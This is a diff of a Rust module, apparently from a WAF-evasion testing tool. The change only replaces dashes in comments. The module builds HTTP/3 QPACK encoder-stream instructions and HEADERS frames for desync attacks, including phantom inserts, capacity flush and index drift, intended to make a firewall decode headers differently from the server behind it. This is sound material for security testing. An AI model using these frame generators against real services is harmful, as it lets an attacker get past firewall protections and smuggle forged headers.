@@ -16,18 +16,18 @@
 //!
 //! If an attacker can inject or forge encoder stream bytes, they can:
 //!
-//! 1. **Insert phantom entries** — entries the WAF inserts but the server
+//! 1. **Insert phantom entries**: entries the WAF inserts but the server
 //!    doesn't, so WAF decodes `Authorization: Bearer <token>` while the
 //!    server sees a different field
-//! 2. **Corrupt the insert count** — make the WAF believe RIC=N is satisfied
+//! 2. **Corrupt the insert count**: make the WAF believe RIC=N is satisfied
 //!    by table entries it has, while the server's table has different entries
 //!    at the same index
-//! 3. **Table overflow** — insert entries that push old entries out of the
+//! 3. **Table overflow**: insert entries that push old entries out of the
 //!    WAF's table, causing future frames to decode differently at WAF vs server
 //!
 //! ## Attack: header field smuggling via QPACK name/value interleaving
 //!
-//! RFC 9204 §3.2.3 allows "Literal Field Line with Post-Base Index" — a
+//! RFC 9204 §3.2.3 allows "Literal Field Line with Post-Base Index", a
 //! field that references a table entry that hasn't been inserted yet (a
 //! forward reference, blocked until the entry arrives). If the WAF's QPACK
 //! implementation doesn't correctly block on forward references, it may
@@ -37,10 +37,10 @@
 //! ## Wire format reference
 //!
 //! Encoder stream instructions (RFC 9204 §3.2):
-//! - `1xxxxxxx` — Insert With Name Reference (static or dynamic table)
-//! - `01xxxxxx` — Insert With Literal Name
-//! - `001xxxxx` — Duplicate (copy existing dynamic table entry)
-//! - `00100000` — Set Dynamic Table Capacity
+//! - `1xxxxxxx`: Insert With Name Reference (static or dynamic table)
+//! - `01xxxxxx`: Insert With Literal Name
+//! - `001xxxxx`: Duplicate (copy existing dynamic table entry)
+//! - `00100000`: Set Dynamic Table Capacity
 
 use crate::{EvasionFrame, EvasionFrameSet, EvasionTechnique};
 
@@ -79,7 +79,7 @@ pub struct QpackInstruction {
 pub struct QpackEncoder {
     /// Current simulated dynamic table insert count (absolute index).
     insert_count: u64,
-    /// Max dynamic table capacity in bytes — used for capacity-overflow
+    /// Max dynamic table capacity in bytes, used for capacity-overflow
     /// attack planning (entries pushed out once this budget is exhausted).
     pub max_capacity: u32,
 }
@@ -92,7 +92,7 @@ impl QpackEncoder {
         }
     }
 
-    /// RFC 9204 §3.2.1 — Insert With Literal Name.
+    /// RFC 9204 §3.2.1: Insert With Literal Name.
     ///
     /// Instruction: `01 N 0 xxxxxxx | name_len | name | value_len | value`
     /// `N` = never-index bit (0 = indexable).
@@ -102,7 +102,7 @@ impl QpackEncoder {
         // RFC 9204 uses QPACK integer encoding (RFC 9204 §1.3 = same as HPACK).
         let name_b = name.as_bytes();
         let val_b = value.as_bytes();
-        // 0b01_0_XXXXX — first byte prefix 0x40, never-index=0
+        // 0b01_0_XXXXX, first byte prefix 0x40, never-index=0
         bytes.push(0x40 | encode_int_first_byte(name_b.len() as u64, 5));
         bytes.extend_from_slice(&encode_int_tail(name_b.len() as u64, 5));
         bytes.extend_from_slice(name_b);
@@ -120,7 +120,7 @@ impl QpackEncoder {
         }
     }
 
-    /// RFC 9204 §3.2.4 — Set Dynamic Table Capacity.
+    /// RFC 9204 §3.2.4: Set Dynamic Table Capacity.
     ///
     /// Instruction: `001 XXXXX` with the new capacity value.
     pub fn set_capacity(&self, capacity: u32) -> QpackInstruction {
@@ -134,12 +134,12 @@ impl QpackEncoder {
         }
     }
 
-    /// RFC 9204 §3.2.3 — Duplicate (copy dynamic table entry at `index`).
+    /// RFC 9204 §3.2.3: Duplicate (copy dynamic table entry at `index`).
     ///
     /// Instruction: `000 XXXXX` with the relative index.
     pub fn duplicate(&self, relative_index: u64) -> QpackInstruction {
         let mut bytes = Vec::new();
-        // Prefix: 0b000_XXXXX = 0x00 — pattern stays explicit for
+        // Prefix: 0b000_XXXXX = 0x00, pattern stays explicit for
         // parity with the other QPACK instruction encoders below,
         // which mask in non-zero prefix bits.
         bytes.push(encode_int_first_byte(relative_index, 5));
@@ -150,7 +150,7 @@ impl QpackEncoder {
         }
     }
 
-    /// RFC 9204 §3.2.2 — Insert With Name Reference (from static table).
+    /// RFC 9204 §3.2.2: Insert With Name Reference (from static table).
     ///
     /// Instruction: `1 T XXXXXXX` where T=1 means static table reference.
     pub fn insert_with_static_ref(&mut self, static_index: u64, value: &str) -> QpackInstruction {
@@ -200,7 +200,7 @@ pub struct QpackDesyncAttack {
     /// Encoder stream instructions to send before the HEADERS frame.
     pub encoder_stream_bytes: Vec<u8>,
     /// The HEADERS frame body (field block) to send on the request stream.
-    /// This is NOT a complete HTTP/3 HEADERS frame — it is the field block
+    /// This is NOT a complete HTTP/3 HEADERS frame, it is the field block
     /// payload, which the caller wraps in an HTTP/3 HEADERS frame (type 0x01).
     pub headers_field_block: Vec<u8>,
     pub description: String,
@@ -235,7 +235,7 @@ impl QpackDesyncAttack {
         encoder_stream.extend_from_slice(&instr.bytes);
         // Build a HEADERS field block that references the dynamic table entry
         // for the attack header (relative index 0 = most recently inserted).
-        // RFC 9204 §3.2.6 — Indexed Field Line with Dynamic Table
+        // RFC 9204 §3.2.6: Indexed Field Line with Dynamic Table
         // Prefix: `1 0 XXXXXX` where bit 6=0 means dynamic table.
         let mut field_block = Vec::new();
         // Required Insert Count (S bit encodes whether it's > max_entries/2)
@@ -263,7 +263,7 @@ impl QpackDesyncAttack {
     ///
     /// Sends `Set Dynamic Table Capacity = 0` on the encoder stream,
     /// which a conformant decoder must apply (evicting all entries).
-    /// Then immediately sends a HEADERS frame with a high RIC — a WAF
+    /// Then immediately sends a HEADERS frame with a high RIC, a WAF
     /// that processes capacity changes asynchronously may still have
     /// stale entries and decode the frame differently.
     pub fn capacity_flush(attack_header: (&str, &str)) -> Self {
@@ -317,7 +317,7 @@ impl QpackDesyncAttack {
         let attack = enc.insert_literal(name, value);
         encoder_stream.extend_from_slice(&attack.bytes);
 
-        // Duplicate the decoy N times — this shifts all relative indices.
+        // Duplicate the decoy N times (this shifts all relative indices).
         for i in 0..n_drifts {
             // Relative index of the decoy (which was inserted before attack).
             // After inserting decoy (count=1) and attack (count=2), decoy's
@@ -355,7 +355,7 @@ impl QpackDesyncAttack {
         if !self.encoder_stream_bytes.is_empty() {
             frames.push(EvasionFrame {
                 bytes: self.encoder_stream_bytes.clone(),
-                description: format!("{} — encoder stream instructions", self.description),
+                description: format!("{}, encoder stream instructions", self.description),
                 technique: EvasionTechnique::QpackDesync,
                 stream_id: 2, // unidirectional encoder stream
             });
@@ -364,7 +364,7 @@ impl QpackDesyncAttack {
         let h3_headers = http3_headers_frame(&self.headers_field_block);
         frames.push(EvasionFrame {
             bytes: h3_headers,
-            description: format!("{} — HEADERS frame", self.description),
+            description: format!("{}: HEADERS frame", self.description),
             technique: EvasionTechnique::QpackDesync,
             stream_id: 0, // request stream
         });
@@ -436,11 +436,11 @@ pub fn decode_qpack_int(bytes: &[u8], pos: usize, prefix_bits: u8) -> Option<(u6
         return None;
     }
     // QPACK prefixes are 1–8 bits (RFC 9204). Compute the mask in a wider
-    // type: `prefix_bits == 8` is real — the Required-Insert-Count field uses
+    // type: `prefix_bits == 8` is real, the Required-Insert-Count field uses
     // an 8-bit prefix (`encode_int_first_byte(ric, 8)` at the field-block
     // prefix), and the encode side already accepts 8 (`1u64 << 8` is fine).
     // The pre-fix `1u8 << prefix_bits` PANICS at prefix_bits==8 (shift equals
-    // the u8 width), leaving encode/decode asymmetric — a decoder round-
+    // the u8 width), leaving encode/decode asymmetric, a decoder round-
     // tripping the RIC field would crash. Clamp ≥8 to a full-byte mask.
     let mask = ((1u16 << u16::from(prefix_bits.min(8))) - 1) as u8;
     let first = (bytes[pos] & mask) as u64;
@@ -567,7 +567,7 @@ mod tests {
         let field_block = vec![0u8; 100];
         let frame = http3_headers_frame(&field_block);
         assert_eq!(frame[0], 0x01); // type
-        // 2-byte varint prefix: RFC 9000 §16 — 64..=16383 uses `01` high bits.
+        // 2-byte varint prefix: RFC 9000 §16: 64..=16383 uses `01` high bits.
         assert_eq!(
             frame[1] >> 6,
             1,
@@ -580,7 +580,7 @@ mod tests {
         // Pre-fix: field blocks >= 16384 bytes overflowed the 2-byte varint
         // (14-bit capacity = 16383 max), silently corrupting the length field.
         // The frame would declare length = (16384 >> 8) & 0xFF = 0x40 OR'd into
-        // 0x40 = 0x40, then low byte 0x00 — encoding only 2 bytes but the value
+        // 0x40 = 0x40, then low byte 0x00, encoding only 2 bytes but the value
         // 0x4000 = 16384 as a QUIC varint requires 4 bytes (0x80 prefix flag).
         let field_block = vec![0u8; 16384];
         let frame = http3_headers_frame(&field_block);
@@ -819,7 +819,7 @@ mod tests {
     #[test]
     fn http3_headers_frame_empty_field_block() {
         let frame = http3_headers_frame(&[]);
-        // type byte + length byte (0) — no payload
+        // type byte + length byte (0), no payload
         assert_eq!(frame[0], 0x01, "type must be 0x01");
         assert_eq!(
             frame[1], 0x00,
@@ -918,7 +918,7 @@ mod tests {
 
         /// An `insert_literal` instruction is faithful: parsing its QPACK integer
         /// length fields and the bytes that follow recovers the exact header name
-        /// and value — including multibyte and control characters.
+        /// and value (including multibyte and control characters).
         #[test]
         fn prop_insert_literal_roundtrips(name in ".{0,40}", value in ".{0,40}") {
             let mut enc = QpackEncoder::new(4096);
